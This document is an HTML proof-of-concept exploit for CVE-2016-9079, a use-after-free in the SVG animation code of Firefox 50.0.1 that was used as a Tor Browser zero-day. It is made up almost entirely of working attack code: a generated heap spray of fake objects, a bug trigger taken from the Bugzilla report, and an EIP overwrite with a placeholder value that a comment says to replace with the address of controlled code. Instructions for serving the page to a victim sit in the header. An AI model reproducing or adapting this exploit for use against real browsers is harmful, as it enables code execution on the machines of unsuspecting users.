
<!DOCTYPE HTML>

<!--

    exploit primitive which sets EIP to 0x41414141 (after spraying fake objects)

    PoC Exploit against Firefox 50.0.1 (CVE-2016-9079 - Tor Browser 0day)

    Tested on:

    Release 50.0.1 32-bit - Windows 8.1 / Windows 10
    https://ftp.mozilla.org/pub/firefox/releases/50.0.1/win32/en-US/Firefox%20Setup%2050.0.1.exe

    Howto:

    1) serve PoC over network and open it in Firefox 50.0.1 32-bit

    A successfull exploit attempt should set EIP to 0x41414141

-->

<script>

/* heap spray inspired by skylined */
function heap_spray_fake_objects(){
    var heap = []
    var current_address = 0x08000000
    var block_size =      0x01000000

    while(current_address < object_target_address){
        var heap_block = new Uint32Array(block_size/4 - 0x100)
        //var heap_block = new ArrayBuffer(block_size/4 - 0x100)
        for (var offset = 0; offset < block_size; offset += 0x100000){

//--- GENERATED PART START ---
heap_block[offset/4 + -0xf54/4] = object_target_address +-0x88; // 0xd0000f54L -> -0xf54L (-0xf54L)
heap_block[offset/4 + -0xf54/4] = object_target_address +-0x88; // 0xd0000f54L -> -0xf54L (-0xf54L)
heap_block[offset/4 + 0xac/4] = 0x1; // -0xf54L -> 0xacL (0x134L)
heap_block[offset/4 + 0xac/4] = 0x1; // -0xf54L -> 0xacL (0x134L)
heap_block[offset/4 + 0x70/4] = object_target_address +0x110; // 0xd0000f54L -> 0x70L (0x70L)
heap_block[offset/4 + 0x70/4] = object_target_address +0x110; // 0xd0000f54L -> 0x70L (0x70L)
heap_block[offset/4 + 0x0/4] = object_target_address +0x1094; // 0xd0000f54L -> 0x0L (0x0L)
heap_block[offset/4 + 0x0/4] = object_target_address +0x1094; // 0xd0000f54L -> 0x0L (0x0L)
heap_block[offset/4 + 0xac/4] = 0x1; // -0xf54L -> 0xacL (0x134L)
heap_block[offset/4 + 0xac/4] = 0x1; // -0xf54L -> 0xacL (0x134L)
heap_block[offset/4 + 0x10ac/4] = 0xff; // 0x0L -> 0x10acL (0x18L)
heap_block[offset/4 + 0x10ac/4] = 0xff; // 0x0L -> 0x10acL (0x18L)
heap_block[offset/4 + 0x10a8/4] = object_target_address +0x20ac; // 0x0L -> 0x10a8L (0x14L)
heap_block[offset/4 + 0x10a8/4] = object_target_address +0x20ac; // 0x0L -> 0x10a8L (0x14L)
heap_block[offset/4 + 0x1094/4] = object_target_address +0x3f70; // 0x0L -> 0x1094L (0x0L)
heap_block[offset/4 + 0x1094/4] = object_target_address +0x3f70; // 0x0L -> 0x1094L (0x0L)
heap_block[offset/4 + 0x20ac/4] = object_target_address +0x2f74; // 0x10a8L -> 0x20acL (0x0)
heap_block[offset/4 + 0x20ac/4] = object_target_address +0x2f74; // 0x10a8L -> 0x20acL (0x0)
heap_block[offset/4 + 0x20b8/4] = object_target_address +0x220; // 0x10a8L -> 0x20b8L (0xcL)
heap_block[offset/4 + 0x20b8/4] = object_target_address +0x220; // 0x10a8L -> 0x20b8L (0xcL)
heap_block[offset/4 + 0x20c0/4] = 0x0; // 0x10a8L -> 0x20c0L (0x14L)
heap_block[offset/4 + 0x20c0/4] = 0x0; // 0x10a8L -> 0x20c0L (0x14L)
heap_block[offset/4 + 0x212c/4] = object_target_address +0x220; // 0x10a8L -> 0x212cL (0x80L)
heap_block[offset/4 + 0x212c/4] = object_target_address +0x220; // 0x10a8L -> 0x212cL (0x80L)
heap_block[offset/4 + 0x40ac/4] = object_target_address +0x330; // 0x1094L -> 0x40acL (0x13cL)
heap_block[offset/4 + 0x40ac/4] = object_target_address +0x330; // 0x1094L -> 0x40acL (0x13cL)
heap_block[offset/4 + 0x30ac/4] = object_target_address +0x440; // 0x20acL -> 0x30acL (0x138L)
heap_block[offset/4 + 0x30ac/4] = object_target_address +0x440; // 0x20acL -> 0x30acL (0x138L)
heap_block[offset/4 + 0x2fe0/4] = object_target_address +0x440; // 0x20acL -> 0x2fe0L (0x6cL)
heap_block[offset/4 + 0x2fe0/4] = object_target_address +0x440; // 0x20acL -> 0x2fe0L (0x6cL)
heap_block[offset/4 + 0x30b0/4] = object_target_address +0x440; // 0x20acL -> 0x30b0L (0x13cL)
heap_block[offset/4 + 0x30b0/4] = object_target_address +0x440; // 0x20acL -> 0x30b0L (0x13cL)
        }
//--- GENERATED PART END ---
        heap.push(heap_block)
        current_address += block_size
    }
    return heap
}

/* address of fake object */
object_target_address = 0x30300000

/* replace with address of controlled code */
EIP = 0x41414141

/* spray fake objects */
heap = heap_spray_fake_objects()

/* -----> */
/* bug trigger ripped from bugzilla report */
var worker = new Worker('data:javascript,self.onmessage=function(msg){postMessage("one");postMessage("two");};');
worker.postMessage("zero");
var svgns = 'http://www.w3.org/2000/svg';
var heap80 = new Array(0x1000);
var heap100 = new Array(0x4000);
var block80 = new ArrayBuffer(0x80);
var block100 = new ArrayBuffer(0x100);
var sprayBase = undefined;
var arrBase = undefined;
var animateX = undefined;
var containerA = undefined;
var offset = 0x88 // Firefox 50.0.1

var exploit = function(){
    var u32 = new Uint32Array(block80)

    u32[0x4] = arrBase - offset;
    u32[0xa] = arrBase - offset;
    u32[0x10] = arrBase - offset;
	u32[0] = 0xaabbccdd;
	u32[1] = 0xaabbccee;
	u32[0x11] = 0xaabbccff;

    for(i = heap100.length/2; i < heap100.length; i++)
    {
      heap100[i] = block100.slice(0)
    }

    for(i = 0; i < heap80.length/2; i++)
    {
      heap80[i] = block80.slice(0)
    }

    animateX.setAttribute('begin', '59s')
    animateX.setAttribute('begin', '58s')

    for(i = heap80.length/2; i < heap80.length; i++)
    {
      heap80[i] = block80.slice(0)
    }

    for(i = heap100.length/2; i < heap100.length; i++)
    {
      heap100[i] = block100.slice(0)
    }

    animateX.setAttribute('begin', '10s')
    animateX.setAttribute('begin', '9s')
    containerA.pauseAnimations();
}

worker.onmessage = function(e) {arrBase=object_target_address; exploit()}

var trigger = function(){
    containerA = document.createElementNS(svgns, 'svg')
    var containerB = document.createElementNS(svgns, 'svg');
    animateX = document.createElementNS(svgns, 'animate')
    var animateA = document.createElementNS(svgns, 'animate')
    var animateB = document.createElementNS(svgns, 'animate')
    var animateC = document.createElementNS(svgns, 'animate')
    var idA = "ia";
    var idC = "ic";
    animateA.setAttribute('id', idA);
    animateA.setAttribute('end', '50s');
    animateB.setAttribute('begin', '60s');
    animateB.setAttribute('end', idC + '.end');
    animateC.setAttribute('id', idC);
    animateC.setAttribute('end', idA + '.end');
    containerA.appendChild(animateX)
    containerA.appendChild(animateA)
    containerA.appendChild(animateB)
    containerB.appendChild(animateC)
    document.body.appendChild(containerA);
    document.body.appendChild(containerB);
}

window.onload = trigger;
setInterval("window.location.reload()", 3000)
/* <----- */

</script>
